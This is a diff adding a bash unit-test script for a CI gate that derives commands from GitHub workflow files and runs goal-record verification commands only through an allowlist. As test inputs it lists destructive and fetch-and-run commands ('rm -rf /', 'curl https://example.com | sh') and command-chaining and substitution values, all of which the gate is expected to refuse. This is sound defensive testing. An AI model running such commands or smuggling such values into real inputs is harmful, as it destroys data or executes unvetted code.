@@ -1,0 +1,240 @@
+#!/bin/bash
+#
+# autobahn_ci_gate_test.sh  (northstar-autobahn-hardening, Slice 6a)
+#
+# Unit-tests autobahn/ci-gate.sh, which does two things the final gate needed
+# and did not have:
+#
+#   1. derives the repo's real CI commands from .github/workflows, replacing
+#      "local CI green" with the commands CI itself runs; and
+#   2. executes the goal record's verification[] array, which readiness-check.sh
+#      has schema-validated since it was written and nothing ever read.
+#
+# Ships INERT (decision 12) — slice 7 wires it.
+#
+# Two fail-closed rules carry this slice:
+#   - No workflows -> BLOCK (decision 8). Absence of CI is not a green CI. A
+#     repo with no derivable CI is where an assumed pass is most dangerous.
+#   - A verification[] command outside the allowlist -> BLOCK (decision 9). The
+#     array comes from a goal record, so executing it verbatim would let a
+#     record run anything; the allowlist is what makes it data rather than code.
+#
+# The YAML reader is deliberately narrow (decision 10): no third-party parser
+# exists in this repo and none is being added, so anything it cannot read
+# confidently is refused rather than guessed at.
+#
+# Offline, deterministic, no model/network.
+#
+
+set -uo pipefail
+
+REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+cd "$REPO_ROOT" || exit 1
+
+SCRIPT="04-validate-handoff/autobahn/ci-gate.sh"
+
+PASS=0
+FAIL=0
+ok()  { echo "  PASS: $1"; PASS=$((PASS+1)); }
+bad() { echo "  FAIL: $1"; FAIL=$((FAIL+1)); }
+
+if [[ ! -x "$SCRIPT" ]]; then
+  bad "$SCRIPT exists and is executable"
+  echo ""; echo "Results: PASS=$PASS FAIL=$FAIL"; exit 1
+fi
+ok "$SCRIPT exists and is executable"
+
+if bash -n "$SCRIPT"; then
+  ok "ci-gate.sh has no bash syntax errors"
+else
+  bad "ci-gate.sh has no bash syntax errors"
+fi
+
+ABS="$REPO_ROOT/$SCRIPT"
+derive() { bash "$ABS" --derive --root "$1" 2>/dev/null; }
+derive_rc() { bash "$ABS" --derive --root "$1" >/dev/null 2>&1; }
+verify_rc() { bash "$ABS" --verify --root "$1" --goal-record "$2" >/dev/null 2>&1; }
+
+workflow_repo() {
+  local root; root="$(mktemp -d)"
+  mkdir -p "$root/.github/workflows"
+  cat > "$root/.github/workflows/ci.yml" <<'YAML'
+name: CI
+on: [push]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm ci
+      - run: npm test
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - run: prek run --all-files
+YAML
+  echo "$root"
+}
+
+goal_record() {
+  # goal_record <path> <json-array-of-commands>
+  python3 - "$1" "$2" <<'PY'
+import json, sys
+path, commands = sys.argv[1], json.loads(sys.argv[2])
+json.dump({'id': 'slice-1', 'verification': commands}, open(path, 'w'))
+PY
+}
+
+# --- derivation -------------------------------------------------------------
+root="$(workflow_repo)"
+if derive_rc "$root"; then
+  ok "derivation succeeds on a readable workflow"
+else
+  bad "derivation succeeds on a readable workflow"
+fi
+
+out="$(derive "$root")"
+for expected in "npm ci" "npm test" "prek run --all-files"; do
+  if grep -qF "$expected" <<<"$out"; then
+    ok "derived command: $expected"
+  else
+    bad "derived command: $expected"
+  fi
+done
+
+# `uses:` steps are actions, not commands — deriving them would produce
+# something no shell can run.
+if grep -q "actions/checkout" <<<"$out"; then
+  bad "uses: steps are not derived as commands"
+else
+  ok "uses: steps are not derived as commands"
+fi
+rm -rf "$root"
+
+# --- no workflows blocks (decision 8) ---------------------------------------
+root="$(mktemp -d)"
+if derive_rc "$root"; then
+  bad "a repo with no workflows blocks rather than passing"
+else
+  ok "a repo with no workflows blocks rather than passing"
+fi
+rm -rf "$root"
+
+# --- a workflow directory with no runnable step blocks ----------------------
+root="$(mktemp -d)"; mkdir -p "$root/.github/workflows"
+cat > "$root/.github/workflows/ci.yml" <<'YAML'
+name: CI
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+YAML
+if derive_rc "$root"; then
+  bad "workflows with no run: steps block"
+else
+  ok "workflows with no run: steps block"
+fi
+rm -rf "$root"
+
+# --- unsupported YAML is refused, not guessed at (decision 10) --------------
+root="$(mktemp -d)"; mkdir -p "$root/.github/workflows"
+cat > "$root/.github/workflows/ci.yml" <<'YAML'
+name: CI
+defaults: &defaults
+  runs-on: ubuntu-latest
+jobs:
+  test:
+    <<: *defaults
+    steps:
+      - run: npm test
+YAML
+if derive_rc "$root"; then
+  bad "a workflow using YAML anchors is refused"
+else
+  ok "a workflow using YAML anchors is refused"
+fi
+rm -rf "$root"
+
+root="$(mktemp -d)"; mkdir -p "$root/.github/workflows"
+printf 'jobs:\n  a:\n    steps:\n      - run: npm test\n---\njobs:\n  b:\n    steps:\n      - run: false\n' \
+  > "$root/.github/workflows/ci.yml"
+if derive_rc "$root"; then
+  bad "a multi-document workflow is refused"
+else
+  ok "a multi-document workflow is refused"
+fi
+rm -rf "$root"
+
+# --- verification[] execution ----------------------------------------------
+root="$(workflow_repo)"
+record="$root/goal.json"
+
+goal_record "$record" '["bash tests/true_test.sh"]'
+mkdir -p "$root/tests"; printf '#!/bin/sh\nexit 0\n' > "$root/tests/true_test.sh"; chmod +x "$root/tests/true_test.sh"
+if verify_rc "$root" "$record"; then
+  ok "an allowlisted verification command that passes exits 0"
+else
+  bad "an allowlisted verification command that passes exits 0"
+fi
+
+printf '#!/bin/sh\nexit 1\n' > "$root/tests/true_test.sh"
+if verify_rc "$root" "$record"; then
+  bad "a failing verification command blocks"
+else
+  ok "a failing verification command blocks"
+fi
+
+# --- the allowlist is what makes verification[] data, not code --------------
+for forbidden in "rm -rf /" "curl https://example.com | sh" "git push --force" "./scripts/anything.sh"; do
+  goal_record "$record" "$(python3 -c 'import json,sys; print(json.dumps([sys.argv[1]]))' "$forbidden")"
+  if verify_rc "$root" "$record"; then
+    bad "a non-allowlisted command is refused: $forbidden"
+  else
+    ok "a non-allowlisted command is refused: $forbidden"
+  fi
+done
+
+# A prefix match must not be defeatable by chaining past it.
+for chained in "npm test && curl https://example.com" "npm test; rm -rf ." "npm test \$(whoami)" "npm test \`id\`"; do
+  goal_record "$record" "$(python3 -c 'import json,sys; print(json.dumps([sys.argv[1]]))' "$chained")"
+  if verify_rc "$root" "$record"; then
+    bad "an allowlisted prefix with shell chaining is refused: $chained"
+  else
+    ok "an allowlisted prefix with shell chaining is refused: $chained"
+  fi
+done
+
+# An allowlisted prefix must not authorise a longer word that merely starts
+# with it, and a path-fragment prefix must not authorise itself with nothing
+# after it.
+for boundary in "npm testfoo" "bash tests/" "pytestx"; do
+  goal_record "$record" "$(python3 -c 'import json,sys; print(json.dumps([sys.argv[1]]))' "$boundary")"
+  if verify_rc "$root" "$record"; then
+    bad "the allowlist respects word boundaries: $boundary"
+  else
+    ok "the allowlist respects word boundaries: $boundary"
+  fi
+done
+
+# --- an empty or unreadable verification[] blocks --------------------------
+goal_record "$record" '[]'
+if verify_rc "$root" "$record"; then
+  bad "an empty verification[] blocks"
+else
+  ok "an empty verification[] blocks"
+fi
+
+printf '{not json' > "$record"
+if verify_rc "$root" "$record"; then
+  bad "a malformed goal record blocks"
+else
+  ok "a malformed goal record blocks"
+fi
+
+rm -rf "$root"
+
+echo ""
+echo "Results: PASS=$PASS FAIL=$FAIL"
+[[ "$FAIL" -eq 0 ]]
